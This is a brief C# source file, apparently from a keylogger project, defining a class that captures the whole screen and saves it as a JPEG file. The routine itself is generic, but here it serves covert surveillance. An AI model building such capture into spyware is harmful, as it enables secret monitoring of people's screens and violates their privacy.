using System.Drawing;
using System.Drawing.Imaging;

namespace Keylogger.Managers
{
    public class ScreenCapturer
    {
        public void TakeScreenshot(string screenshotPath)
        {
            Bitmap bitmap = new Bitmap(1920, 1024);
            Graphics graphics = Graphics.FromImage(bitmap);

            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
            bitmap.Save(screenshotPath, ImageFormat.Jpeg);
        }
    }
}